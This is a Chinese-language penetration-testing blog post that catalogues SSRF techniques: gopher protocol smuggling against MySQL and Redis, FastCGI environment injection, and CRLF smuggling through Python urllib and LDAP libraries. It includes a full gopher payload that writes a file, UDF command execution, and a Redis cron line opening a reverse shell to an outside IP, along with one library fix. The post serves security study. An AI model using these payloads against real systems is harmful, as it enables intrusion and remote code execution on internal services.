@@ -1,0 +1,446 @@
+---
+layout: post  
+title: "SSRF攻击姿势汇总"  
+date: 2020-05-15
+description: "渗透测试"
+tag: 渗透测试
+---
+
+#前言
+
+最近笔者在看讲SSRF、protocol 	smuggle、HTTP request smuggle、SSO任意跳转，Url解析不一致导致的安全问题。一方面由衷地佩服演讲人的脑洞和安全功底，另外一方面又在笔者又在反思，如果是我，我会怎么去发现此类漏洞，解决方案又是什么。本文不同于各大公众号千篇一律的复现、验证漏洞文章，会加入自己的思考和心得。鉴于文章会存在一些敏感内容，笔者会本着在删除敏感内容的前提下，尽量让大家都能看懂的标准去和大家一起探讨这方面的知识。
+
+在学习前之前我会给自己提出来如下问题:
+
+1.漏洞的本质到底什么
+
+2.应该如何防御
+
+3.如何发现同类漏洞，如何自动化找到此类漏洞甚至0day
+
+##  什么是SSRF
+
+SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）。
+
+````
+<?php
+	$ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $_GET['url']);
+    #curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+    curl_setopt($ch, CURLOPT_HEADER, 0);
+    #curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);
+    $data =curl_exec($ch);
+    curl_close($ch);
+    echo $data;
+?>
+````
+
+很多介绍SSRF的文章都会以这个作为演示Demo，可以看看curl支持哪些协议:curl-config --protocols
+
+```
+DICT
+FILE
+FTP
+FTPS
+GOPHER
+HTTP
+HTTPS
+IMAP
+IMAPS
+LDAP
+LDAPS
+POP3
+POP3S
+RTSP
+SMB
+SMBS
+SMTP
+SMTPS
+TELNET
+TFTP
+```
+
+看到Orange Thai 在blackhat中发表的演讲《A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages! 》中将讲解了fuzz思路和利用方法，结合本人的一些理解，将从按照协议走私的方式来分析利用方式。
+
+##  利用gopher协议
+
+###  gopher协议背景介绍
+
+一、Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的[文件组织](https://baike.baidu.com/item/%E6%96%87%E4%BB%B6%E7%BB%84%E7%BB%87/2594062)成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，Gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它；二、地鼠Gopher（[谷佛](https://baike.baidu.com/item/%E8%B0%B7%E4%BD%9B/4399967)）是迪士尼卡通人物之一。
+
+opher协议是个tcp/ip协议，通过gopher协议可以发送tcp stream做的事情。比如我们操作mysql，操作redis，甚至使用smtp协议发送邮件等等都可以通过转换成gopher协议达到一样的效果。
+
+###  gopher protocol smuggle
+
+gopher协议是万金油，通过protocol smuggle能执行转换成太多协议
+
+####  攻击mysql
+
+首先为了实验环境演示尽可能简单，mysql高于5.7需要关闭mysql tls，保证mysql为空密码，关闭tls方法如下
+
+```
+mysql> SHOW VARIABLES LIKE '%ssl%';
++---------------+-----------------+
+| Variable_name | Value           |
++---------------+-----------------+
+| have_openssl  | YES             |
+| have_ssl      | YES             |
+| ssl_ca        | ca.pem          |
+| ssl_capath    |                 |
+| ssl_cert      | server-cert.pem |
+| ssl_cipher    |                 |
+| ssl_crl       |                 |
+| ssl_crlpath   |                 |
+| ssl_key       | server-key.pem  |
++---------------+-----------------+
+9 rows in set (0.00 sec)
+```
+
+编辑配置文件: `/path/to/file/my.cnf`
+
+```
+[mysqld]
+...
+
+skip_ssl
+# disable_ssl
+```
+
+很多文章也介绍了如何通过wireshark 抓包然后转换成gopher协议的文章，比如<https://paper.seebug.org/510/>
+
+或者如果你嫌弃麻烦，直接使用大佬开发的工具<https://xz.aliyun.com/t/5844>即可，协议怎么转成gopher协议，本文不展开。
+
+#####  secure_file_priv和写目录不受任何限制的情况下
+
+如果不受**secure_file_priv**和任何目录的限制，可以直接是导出webshell，导出crontab任务，导入udf并反弹shell
+
+```
+show global variables like '%secure_file_priv%';
+
+mysql> show global variables like '%secure_file_priv%';
++------------------+-----------------------+
+| Variable_name    | Value                 |
++------------------+-----------------------+
+| secure_file_priv | /var/lib/mysql-files/ |
++------------------+-----------------------+
+1 row in set (0.00 sec)
+```
+
+所以可以直接执行
+
+```
+mysql -h 127.0.0.1 -uroot -e "select 'hello' into outfile '/var/lib/mysql-files/eval.php'";
+```
+
+转换成gopher协议利用即可
+
+```
+curl gopher://127.0.0.1:3306/_%a1%00%00%01%85%a2%3f%00%00%00%00%01%08%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%64%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%03%32%34%31%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%36%2e%34%36%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%21%00%00%00%03%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%5f%63%6f%6d%6d%65%6e%74%20%6c%69%6d%69%74%20%31%3c%00%00%00%03%73%65%6c%65%63%74%20%27%68%65%6c%6c%6f%27%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%27%2f%76%61%72%2f%6c%69%62%2f%6d%79%73%71%6c%2d%66%69%6c%65%73%2f%65%76%61%6c%2e%70%68%70%27%01%00%00%00%01
+```
+
+udf攻击
+
+```
+mysql> show variables like "%plugin%";
++---------------+------------------------+
+| Variable_name | Value                  |
++---------------+------------------------+
+| plugin_dir    | /usr/lib/mysql/plugin/ |
++---------------+------------------------+
+1 row in set (0.00 sec)
+```
+
+查看版本和操作系统到<https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql>下载
+
+```
+mysql> select @@version_compile_os, @@version_compile_machine;
++----------------------+---------------------------+
+| @@version_compile_os | @@version_compile_machine |
++----------------------+---------------------------+
+| Linux                | x86_64                    |
++----------------------+---------------------------+
+1 row in set (0.00 sec)
+```
+
+方便演示直接从sqlmap中复制出udf.so文件，实际攻击中可以使用gopher +mysql导出，前提是/usr/lib/mysql/plugin/目录有导出权限
+
+```
+select hex(load_file('/var/lib/mysql-files/mysqludf.so')) into outfile '/var/lib/mysql-files/udf.txt';
+```
+
+```
+select unhex('7F454C46020...') into dumpfile '/usr/lib/mysql/plugin/mysqludf.so';
+```
+
+查看一下so文件中支持哪些函数
+
+```
+nm -D /usr/lib/mysql/plugin/mysqludf.so
+```
+
+导入函数
+
+```
+create Function sys_eval returns string soname 'mysqludf.so';
+select sys_eval ('whoami');
+```
+
+#####  secure_file_priv受到限制
+
+如果secure_file_priv受到限制可以使用<https://www.freebuf.com/column/150308.html>的方法去getshell。除此之外还可以爆破mysql密码之类的。
+
+####  攻击redis
+
+```
+set x "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/101.198.180.248/4444 0>&1\n\n"
+config set dir /var/spool/cron/
+config set dbfilename root
+save
+```
+
+```
+set x "777"
+config set dir /data/
+config set dbfilename just66
+save
+```
+
+老生常谈，很多文章都详细介绍了，这里不做展开，转换成gopher协议即可。
+
+####  mongodb
+
+资料较少
+
+####  zoomkeeper
+
+参考<http://www.polaris-lab.com/index.php/archives/41/>学习
+
+#####  攻击PFM
+
+总结如下，通过fastcgi协议控制PHP环境变量，达到在任何php脚本执行之前执行我们要执行的代码
+
+```
+{
+    'GATEWAY_INTERFACE': 'FastCGI/1.0',
+    'REQUEST_METHOD': 'GET',
+    'SCRIPT_FILENAME': '/var/www/html/index.php',
+    'SCRIPT_NAME': '/index.php',
+    'QUERY_STRING': '?a=1&b=2',
+    'REQUEST_URI': '/index.php?a=1&b=2',
+    'DOCUMENT_ROOT': '/var/www/html',
+    'SERVER_SOFTWARE': 'php/fcgiclient',
+    'REMOTE_ADDR': '127.0.0.1',
+    'REMOTE_PORT': '12345',
+    'SERVER_ADDR': '127.0.0.1',
+    'SERVER_PORT': '80',
+    'SERVER_NAME': "localhost",
+    'SERVER_PROTOCOL': 'HTTP/1.1'
+    'PHP_VALUE': 'auto_prepend_file = php://input',
+    'PHP_ADMIN_VALUE': 'allow_url_include = On'
+}
+```
+
+找到一个已存在的PHP文件
+
+设置 auto_prepend_file 为 php://input 且 allow_url_include = On，在执行任何php文件前都要包含一遍POST的内容，把待执行的代码放在Body中
+
+或者 auto_prepend_file 为 自己的vps地址
+
+######  绕过 disable_functions RCE
+
+可以引入扩展 .so文件 ，hook函数，达到绕过 disable_functions 来RCE的效果
+
+PHP_ADMIN_VALUE['extension'] = hack.so
+
+生成 .so
+
+####  攻击SYSLOG
+
+可以写日志,这点略过
+
+
+
+##  利用http协议
+
+如果不打算从协议角度突破那就是可以利用出各种基于http协议web应用或者中间件或者服务，比如spring,zabbix等等
+
+###  http protocol smuggle
+
+思考一下，很多情况下，如果加入了starts with('http')，恰巧服务器内网在存在体态未授权的redis，我该怎么利用？除了可以利用302跳转，还可以想办法进行protocol smuggle，302跳转不在我们本次讨论的范围。我们考虑点应该是如何使用protocol smuggle，让http做其他协议能做的事情？
+
+在实际场景中，不同语言利用自己的工具包发送http请求。比如python中用httplib，urllib，urllib2，requests，java中用net.URL，ruby会使用Net::HTTP等等。下面来针对此类发送http工具能否protocol smuggle执行fuzz，换言之是否能够利用http协议来做操作redis，ftp，mysql等等，这一个过程我们怎么去fuzz？。
+
+####  思考
+
+我该如何进行fuzz，这些需要捋清思路。根据RFC 3986规范，正常来说一个URL应该找这样。我们考虑在authority、path中插入%0D%0A或者其他字符看看能否达到protocol smuggle的标准。这部分可以写一个程序去fuzz，具体大家也可以自己实现一遍。Orange还在PPT提到，在NodeJs中，CLRF被过滤了，但是使用http://127.0.0.1:6379/ -*SLAVEOF @orange.tw@ 6379-*仍然能够进行protocol smuggle。
+
+可以通过fuzz出不同语言http请求工具库解析造成的protocol smuggle，这部分知道思路之后可以自己写一个工具去fuzz，我只fuzz了python3下的urllib，fuzz出如下 %09 %0a %0d %20任意组合可以达到protocol smuggle的效果,我准备了0-167的ascii码作为字符组合进行fuzz，这个需要提到是开发用的tcp服务器需要用nio来写提高吞吐率。
+
+其中fuzz到很多，下联列出两条
+
+```
+http://127.0.0.1:6379/%09%0aHost:baidu.com%09%0a=>http://127.0.0.1:6379/\t\nHost:baidu.com\t\n
+http://127.0.0.1:6379/%20%09Host:baidu.com%20%09=>http://127.0.0.1:6379/ \tHost:baidu.com \t
+
+```
+
+####  攻击redis
+
+针对python 中的
+
+```
+import urllib
+import urllib.error
+import urllib.request
+
+if __name__=="__main__":
+     url1 = "http://10.211.55.2:6379/a\r\nHost:baidu.com\r\n"#老的
+     url3 = "http://ssrf_redis_host:6379/\t\nSET test success\t\na"
+     urllib.request.urlopen(url3).code
+```
+
+未授权redis中被写入成功
+
+```
+root@19e4c139fc3e:/data# redis-cli 
+127.0.0.1:6379> KEYS *
+1) "test"
+127.0.0.1:6379> GET test
+"success"
+127.0.0.1:6379> 
+```
+
+其实只要整理好思路，针对不同语言的也是类似的fuzz过程，fuzz完之后给python官方提了个issue。
+
+####  攻击syslog
+
+略过，关于更多方式可以见<https://hackerone.com/reports/115748>
+
+
+
+
+
+##  利用LDAP协议
+
+还有一种场景就是，很多开源系统中会存在LDAP测试连接，这个地方的ssrf结合csrf也可以被用来进行利用。还是以python中的python-ldap包为例，可以
+
+```
+import ldap
+
+conn = ldap.initialize("ldap://127.0.0.1:6379")
+conn.simple_bind_s("\r\nSET test1 success\r\n", "admin88")
+```
+
+结果如下
+
+```
+root@1ca44b41ffcf:/data# redis-cli 
+127.0.0.1:6379> KEYS *
+(empty list or set)
+127.0.0.1:6379> KEYS *
+1) "test1"
+127.0.0.1:6379> KEYS *
+1) "test1"
+127.0.0.1:6379> GET test1
+"success"
+127.0.0.1:6379> 
+```
+
+如果使用的是ldap3，效果如下
+
+```
+from ldap3 import Server, Connection, ALL, SUBTREE, ServerPool
+
+ldap_server_pool = ServerPool("ldap://10.211.55.2:6379")
+
+conn = Connection(ldap_server_pool, user="\r\nSET ldap3 success\r\n", password="pass", check_names=True, lazy=False,
+                  raise_exceptions=True)
+conn.bind()
+```
+
+
+
+```
+127.0.0.1:6379> KEYS *
+1) "ldap3"
+2) "test"
+3) "test1"
+127.0.0.1:6379> 
+```
+
+修复方式也很简单，直接在bind之前，执行下open函数，open函数会做一次校验
+
+```
+from ldap3 import Server, Connection, ALL, SUBTREE, ServerPool
+
+ldap_server_pool = ServerPool("ldap://10.211.55.2:6379")
+
+conn = Connection(ldap_server_pool, user="\r\nSET ldap4 success\r\n", password="pass", check_names=True, lazy=False,
+                  raise_exceptions=True)
+conn.open()
+conn.bind()
+```
+
+效果如下
+
+```
+127.0.0.1:6379> KEYS *
+(empty list or set)
+```
+
+
+
+dubbo admin
+
+##利用DICT协议
+
+不展开
+
+
+
+
+
+
+参考资料
+
+<https://github.com/orangetw/Tiny-URL-Fuzzer>
+
+<https://paper.seebug.org/510/>
+
+<https://www.cnblogs.com/0xdd/p/11181490.html>
+
+<https://www.freebuf.com/articles/web/159342.html>
+
+<https://www.jianshu.com/p/fd27f0eedccf>
+
+<https://joychou.org/web/phpssrf.html#directory099269053851112076>
+
+<https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html>
+
+<https://github.com/w181496/FuckFastcgi/>
+
+<https://www.silentrobots.com/blog/2019/02/06/ssrf-protocol-smuggling-in-plaintext-credential-handlers-ldap/>
+
+<https://www.imooc.com/article/45057>
+
+<http://www.cppcns.com/shujuku/mysql/110209.html>
+
+<https://blog.zeddyu.info/2019/12/08/HTTP-Smuggling-en/>
+
+<https://bugs.python.org/issue30458>
+
+<http://regilero.github.io/security/english/2015/10/04/http_smuggling_in_2015_part_one/>
+
+<https://github.com/python/cpython/commit/cc54c1c0d2d05fe7404ba64c53df4b1352ed2262>
+
+<https://github.com/ONsec-Lab/scripts/blob/master/http-splitter-fuzzer.php>
+
+
+
+<https://github.com/alibaba/Sentinel/commit/6f5ede80ae0df34d8063d475204629c3fce50927>
+
+常见的端口和服务<https://mp.weixin.qq.com/s/lTz88XIt9CMdyppSePBAHQ>
+
+
+
+这是很早就整理的笔记，今天想起来发到博客上，还是要保持写文章总结的习惯啊。
